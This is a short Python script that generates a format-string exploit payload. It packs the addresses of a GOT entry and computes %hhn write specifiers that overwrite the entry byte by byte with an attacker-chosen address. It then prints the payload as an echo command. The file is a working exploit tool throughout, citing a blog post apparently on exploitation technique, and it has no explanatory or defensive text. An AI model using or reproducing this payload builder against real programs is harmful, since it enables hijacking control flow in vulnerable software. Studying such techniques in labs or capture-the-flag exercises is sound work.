import struct, sys

def byte2echo(v):
    return 'echo -e "%s"' % repr(v).strip("'")\
                                   .replace('$', '\\$')

# ref: http://inaz2.hatenablog.com/entry/2014/04/20/041453
got_addr = int(sys.argv[1], 16)
goal_addr = int(sys.argv[2], 16)
buf_idx = int(sys.argv[3], 10)

got = ''.join([struct.pack('<I', got_addr+i)
               for i in range(0, 4)])

a = map(ord, struct.pack('<I', goal_addr))
a[3] = (a[3] - a[2]) % 0x100
a[2] = (a[2] - a[1]) % 0x100
a[1] = (a[1] - a[0]) % 0x100
a[0] = (a[0] - len(got)) % 0x100
goal = ''.join(["%%%dx%%%d$hhn" % (a[i], buf_idx+i)
                for i in range(0, 4)])

print(byte2echo(got + goal))
